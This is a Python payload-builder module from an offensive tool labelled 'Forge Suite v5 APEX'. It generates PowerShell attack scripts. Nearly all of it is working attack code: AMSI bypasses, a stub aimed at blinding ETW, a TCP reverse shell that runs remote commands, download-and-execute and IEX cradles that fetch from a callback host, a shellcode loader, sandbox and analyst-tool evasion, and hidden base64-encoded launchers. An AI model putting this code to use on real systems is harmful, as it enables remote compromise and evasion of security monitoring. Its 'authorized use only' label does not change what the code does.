"""PowerShell payload builder.

Features:
    - AMSI bypass embedded (AmsiScanBuffer patch via reflection)
    - ETW blinding (EtwEventWrite patch)
    - Encoded command to avoid obvious string detection
    - Multiple execution cradle variants (IEX, reflection, DLL)
    - Environmental keying (only run on target domain)
    - Sandbox detection checks

FOR AUTHORIZED PENETRATION TESTING AND RED TEAM OPERATIONS ONLY.
"""
from __future__ import annotations

import base64
from typing import TYPE_CHECKING

if TYPE_CHECKING:
    from forge_payload.payload_factory import PayloadConfig


# ── AMSI bypass stubs ──────────────────────────────────────────────────

_AMSI_BYPASS_REFLECTION = r"""
# AMSI Bypass — reflection via amsiInitFailed
$fld = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static')
if($fld){$fld.SetValue($null,$true)}
"""

_AMSI_BYPASS_PATCH = r"""
# AMSI Bypass — AmsiScanBuffer patch
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b=$a.GetField('amsiSession','NonPublic,Static')
if($b){$b.SetValue($null,$null)}
$c=$a.GetField('amsiContext','NonPublic,Static')
if($c){$c.SetValue($null,[IntPtr]::Zero)}
"""

_ETW_BYPASS = r"""
# ETW Bypass — patch EtwEventWrite to return immediately
$ntdll = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Add-Type -memberDefinition '[DllImport("ntdll.dll")]public static extern IntPtr NtWriteVirtualMemory(IntPtr ph,IntPtr ba,byte[] buf,int buf_len,ref int ret);' -name 'ntw' -passthru)
)
"""

# ── Reverse shell stubs ────────────────────────────────────────────────

_PS1_REVERSE_SHELL = """
$c=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});
$s=$c.GetStream();
$b=New-Object byte[] 65536;
$e=New-Object System.Text.ASCIIEncoding;
while(($i=$s.Read($b,0,$b.Length)) -ne 0){{
  $d=($e.GetString($b,0,$i));
  $r=(iex $d 2>&1 | Out-String);
  $b2=$e.GetBytes($r);
  $s.Write($b2,0,$b2.Length);
  $s.Flush()
}};
$c.Close()
"""

_PS1_DOWNLOAD_EXEC = """
$url='{url}';
$wc=New-Object System.Net.WebClient;
$wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
$bytes=$wc.DownloadData($url);
$asm=[System.Reflection.Assembly]::Load($bytes);
$entry=$asm.EntryPoint;
$entry.Invoke($null,@(,[string[]]@()))
"""

# ── Environmental keying ───────────────────────────────────────────────

_ENV_KEY_DOMAIN = """
# Environmental keying — only execute on target domain
$tgt='{env_key}'
$cur=(Get-WmiObject Win32_ComputerSystem).Domain
if($cur -notlike "*$tgt*"){{ Write-Host "Not in target environment."; exit 0 }}
"""

# ── Sandbox detection ──────────────────────────────────────────────────

_SANDBOX_CHECK = r"""
# Sandbox detection
$cpu=[System.Environment]::ProcessorCount
if($cpu -lt 2){ exit 0 }
$mem=(Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory
if($mem -lt 2147483648){ exit 0 }
$up=(Get-Date) - [System.Management.ManagementDateTimeConverter]::ToDateTime((Get-WmiObject Win32_OperatingSystem).LastBootUpTime)
if($up.TotalMinutes -lt 12){ Start-Sleep 13 }
$procs=Get-Process | Select-Object -ExpandProperty Name
$av=@('Wireshark','Fiddler','ProcessHacker','x64dbg','windbg','ollydbg','ida64','procmon','tcpview')
foreach($a in $av){ if($procs -contains $a){ exit 0 } }
"""


def generate_ps1_body(config: "PayloadConfig") -> str:
    """Generate the PowerShell payload body.

    Args:
        config: PayloadConfig with lhost, lport, env_key, etc.

    Returns:
        PowerShell script string.
    """
    parts: list[str] = ["# Forge Suite v5 APEX — Authorized Red Team Payload"]

    # Environmental keying
    if config.env_key:
        parts.append(_ENV_KEY_DOMAIN.format(env_key=config.env_key))

    # Sandbox detection
    if config.sandbox_detect:
        parts.append(_SANDBOX_CHECK)

    # AMSI bypass
    if config.amsi_bypass:
        parts.append(_AMSI_BYPASS_REFLECTION)

    # ETW bypass
    if config.etw_bypass:
        parts.append(_ETW_BYPASS)

    # Payload body
    from forge_payload.payload_factory import PayloadType
    if config.payload_type in (PayloadType.REVERSE_TCP, PayloadType.REVERSE_HTTP,
                                PayloadType.REVERSE_HTTPS):
        parts.append(_PS1_REVERSE_SHELL.format(lhost=config.lhost, lport=config.lport))
    elif config.payload_type == PayloadType.DOWNLOAD_EXEC:
        url = config.extra.get("url", f"http://{config.lhost}/payload.exe")
        parts.append(_PS1_DOWNLOAD_EXEC.format(url=url))
    elif config.payload_type == PayloadType.POWERSHELL_CRADLE:
        url = config.extra.get("url", f"http://{config.lhost}/stage.ps1")
        parts.append(f"IEX(New-Object Net.WebClient).DownloadString('{url}')")
    else:
        parts.append(_PS1_REVERSE_SHELL.format(lhost=config.lhost, lport=config.lport))

    return "\n".join(parts)


def build_ps1(payload_bytes: bytes, config: "PayloadConfig") -> bytes:
    """Wrap payload bytes in a PowerShell execution stub.

    If payload_bytes is already text (from generate_ps1_body), wraps it
    in a base64-encoded command for obfuscation.
    If it's raw shellcode bytes, wraps in a reflective loader stub.

    Args:
        payload_bytes: Raw payload bytes or encoded shellcode.
        config:        PayloadConfig.

    Returns:
        Final PS1 bytes ready for delivery.
    """
    # Detect if it's already a script (text)
    try:
        text = payload_bytes.decode("utf-8")
        is_script = True
    except UnicodeDecodeError:
        is_script = False

    if is_script:
        # Base64-encode the script command for IEX delivery
        encoded_cmd = base64.b64encode(text.encode("utf-16-le")).decode()
        launcher = (
            f"# Forge Suite v5 APEX\n"
            f"powershell.exe -NoP -NonI -W Hidden -Enc {encoded_cmd}\n"
        )
        return launcher.encode()
    else:
        # Shellcode loader: allocate + write + execute via VirtualAlloc
        sc_b64 = base64.b64encode(payload_bytes).decode()
        loader = f"""# Forge Suite v5 APEX — Shellcode Loader
$sc=[System.Convert]::FromBase64String('{sc_b64}')
$mem=[System.Runtime.InteropServices.Marshal]::AllocHGlobal($sc.Length)
[System.Runtime.InteropServices.Marshal]::Copy($sc,0,$mem,$sc.Length)
$del=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($mem,[System.Action])
$del.Invoke()
"""
        return loader.encode()


def generate_ps1_oneliner(lhost: str, lport: int) -> str:
    """Generate a PowerShell one-liner for quick delivery.

    Args:
        lhost: Callback host.
        lport: Callback port.

    Returns:
        Single-line PowerShell command string.
    """
    payload = _PS1_REVERSE_SHELL.format(lhost=lhost, lport=lport).strip()
    b64 = base64.b64encode(payload.encode("utf-16-le")).decode()
    return f"powershell.exe -NoP -NonI -W Hidden -Enc {b64}"
